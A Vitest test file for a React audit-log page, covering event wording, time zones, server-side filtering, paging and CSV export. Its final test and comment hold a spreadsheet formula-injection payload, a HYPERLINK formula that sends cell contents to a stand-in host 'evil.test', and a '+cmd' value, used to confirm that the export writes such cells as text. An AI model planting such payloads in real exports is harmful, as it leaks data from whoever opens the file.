import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { screen, waitFor, fireEvent, within } from '@testing-library/react'
import { renderWithProviders, setRomeTimeZone } from '../test/helpers'
import { expectNoAxeViolations } from '../test/axe'
import { api } from '../lib/api'
import { Audit } from './Audit'

type Params = { limit?: number; offset?: number; category?: string }

const ROWS = [
  { id: 6, timestamp: '2026-07-01 09:05:00', username: 'admin', action: 'login', target: '', details: '' },
  { id: 5, timestamp: '2026-07-01 09:04:00', username: 'admin', action: 'clear_domain_blacklist', target: '', details: '{"removed":640929}' },
  { id: 4, timestamp: '2026-07-01 09:03:00', username: 'admin', action: 'import_domain_blacklist', target: 'https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts', details: '{"added":71140,"from":"url","name":"StevenBlack Unified","skipped":0}' },
  { id: 3, timestamp: '2026-07-01 09:02:00', username: 'system', action: 'refresh_blacklists', target: '', details: '{"domain_blacklist":{"added":12,"fetched":2,"failed":0},"ip_blacklist":{"added":0,"fetched":2,"failed":0}}' },
  { id: 2, timestamp: '2026-07-01 09:01:00', username: null, action: 'rotate_keys', target: 'waf', details: 'manual' },
  { id: 1, timestamp: '2026-07-01 09:00:00', username: 'eve', action: 'login_failed', target: '203.0.113.5', details: 'invalid credentials' },
]

let total: number
let retention: number | undefined
const calls: Params[] = []

function page(params: Params = {}) {
  calls.push(params)
  const meta: Record<string, unknown> = { total, limit: params.limit ?? 50, offset: params.offset ?? 0 }
  if (retention !== undefined) meta.retention_days = retention
  return Promise.resolve({ data: { status: 'success', data: ROWS, meta } })
}

describe('Audit', () => {
  beforeEach(() => {
    total = ROWS.length
    retention = 365
    calls.length = 0
    vi.spyOn(api, 'get').mockImplementation(((_url: string, config?: { params?: Params }) => page(config?.params)) as never)
  })
  afterEach(() => { vi.restoreAllMocks(); vi.unstubAllGlobals() })

  it('shows the page from the mockup with the retention from the API, and no axe violation', async () => {
    const { container } = renderWithProviders(<Audit />)
    expect(screen.getByRole('heading', { level: 1, name: 'Audit log' })).toBeInTheDocument()
    expect(screen.getByText('System')).toBeInTheDocument()
    expect(await screen.findByText('Who changed what, and every sign-in. Kept for 365 days.')).toBeInTheDocument()
    const group = screen.getByRole('group', { name: 'Show' })
    expect(within(group).getAllByRole('button').map((b) => b.textContent)).toEqual(['All', 'Changes', 'Sign-ins'])
    expect(within(group).getByRole('button', { name: 'All' })).toHaveAttribute('aria-pressed', 'true')
    expect(screen.getByRole('button', { name: 'Export CSV' })).toBeInTheDocument()
    const table = screen.getByRole('table', { name: 'Audit events' })
    expect(within(table).getAllByRole('columnheader').map((h) => h.textContent)).toEqual(['Time', 'User', 'Event', 'Details'])
    expect(screen.getAllByRole('heading')).toHaveLength(1)
    await expectNoAxeViolations(container)
  })

  it('writes each event in plain words, and an unknown key as recorded', async () => {
    renderWithProviders(<Audit />)
    const table = await screen.findByRole('table', { name: 'Audit events' })
    await within(table).findByText('Removed all 640,929 blocked domains')
    expect(within(table).getByText('Imported 71,140 domains from StevenBlack Unified')).toBeInTheDocument()
    expect(within(table).getByText('From https://raw.githubusercontent.com/StevenBlack/hosts/master/hosts')).toBeInTheDocument()
    expect(within(table).getByText('Auto-refresh added 0 blocked IPs and 12 blocked domains')).toBeInTheDocument()
    expect(within(table).getByText('Signed in')).toBeInTheDocument()
    expect(within(table).getByText('Sign-in failed')).toBeInTheDocument()
    expect(within(table).getByText('From 203.0.113.5. invalid credentials')).toBeInTheDocument()
    expect(within(table).getByText('rotate_keys')).toBeInTheDocument()
    expect(within(table).getByText('waf. manual')).toBeInTheDocument()
    expect(within(table).getByText('No user recorded')).toBeInTheDocument()
    expect(within(table).getAllByText('No details').length).toBeGreaterThan(0)
  })

  it('shows times in the viewer\'s time zone and says which', async () => {
    const restore = setRomeTimeZone()
    renderWithProviders(<Audit />)
    expect(await screen.findByText('2026-07-01 11:00:00')).toBeInTheDocument()
    expect(screen.getByText('Newest first. Times are in your time zone (Europe/Rome).')).toBeInTheDocument()
    restore()
  })

  it('filters on the server and starts the filtered log from its first page', async () => {
    total = 120
    renderWithProviders(<Audit />)
    await screen.findByText('1 to 6 of 120')
    expect(calls.at(-1)).toEqual({ limit: 50, offset: 0, category: 'all' })
    fireEvent.click(screen.getByRole('button', { name: 'Older' }))
    await waitFor(() => expect(calls.at(-1)).toEqual({ limit: 50, offset: 50, category: 'all' }))
    fireEvent.click(screen.getByRole('button', { name: 'Changes' }))
    await waitFor(() => expect(calls.at(-1)).toEqual({ limit: 50, offset: 0, category: 'changes' }))
    expect(screen.getByRole('button', { name: 'Changes' })).toHaveAttribute('aria-pressed', 'true')
    fireEvent.click(screen.getByRole('button', { name: 'Sign-ins' }))
    await waitFor(() => expect(calls.at(-1)).toEqual({ limit: 50, offset: 0, category: 'signins' }))
  })

  it('pages with Newer and Older, Newer disabled on the newest page', async () => {
    total = 120
    renderWithProviders(<Audit />)
    await screen.findByText('1 to 6 of 120')
    expect(screen.getByRole('button', { name: 'Newer' })).toBeDisabled()
    expect(screen.getByRole('button', { name: 'Older' })).toBeEnabled()
  })

  it('says what is missing when the retention is not reported', async () => {
    retention = undefined
    renderWithProviders(<Audit />)
    expect(await screen.findByText('Who changed what, and every sign-in. How long events are kept is not reported.')).toBeInTheDocument()
  })

  it('says what failed when the log does not load', async () => {
    vi.mocked(api.get).mockRejectedValue(new Error('down'))
    renderWithProviders(<Audit />)
    expect(await screen.findByText('The audit log did not answer.')).toBeInTheDocument()
  })

  // A failed login stores whatever username was sent, without authentication,
  // and the audit export wrote it into the CSV as-is: a username such as
  // =HYPERLINK("https://evil/?"&A1,"x") became a live formula in the
  // spreadsheet the admin opened.
  it('exports the whole filtered log as CSV, writing attacker-controlled cells as text, not formulas', async () => {
    vi.mocked(api.get).mockImplementation(((_url: string, config?: { params?: Params }) => {
      calls.push(config?.params ?? {})
      return Promise.resolve({
        data: {
          data: [
            { id: 1, timestamp: '2026-10-24 10:00:00', username: '=HYPERLINK("https://evil.test/?"&A1,"x")', action: 'login_failed', target: '203.0.113.5', details: '+cmd' },
            { id: 2, timestamp: '2026-10-24 10:01:00', username: 'admin', action: 'login', target: '', details: '' },
          ],
          meta: { total: 2, limit: 50, offset: 0, retention_days: 365 },
        },
      })
    }) as never)
    let blob: Blob | undefined
    const createURL = vi.fn((b: Blob) => { blob = b; return 'blob:x' })
    vi.stubGlobal('URL', Object.assign(URL, { createObjectURL: createURL, revokeObjectURL: vi.fn() }))
    const click = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {})

    renderWithProviders(<Audit />)
    await screen.findAllByText('admin')
    fireEvent.click(screen.getByRole('button', { name: /csv/i }))
    await waitFor(() => expect(createURL).toHaveBeenCalled())
    expect(calls.at(-1)).toEqual({ limit: 200, offset: 0, category: 'all' })

    const text = await blob!.text()
    expect(text).toContain(`"'=HYPERLINK(""https://evil.test/?""&A1,""x"")"`)
    expect(text).toContain(`"'+cmd"`)
    expect(text).not.toMatch(/(^|,)"=/m)
    expect(text).toContain('"admin"')
    expect(text).toContain('"Sign-in failed"')
    click.mockRestore()
  })
})
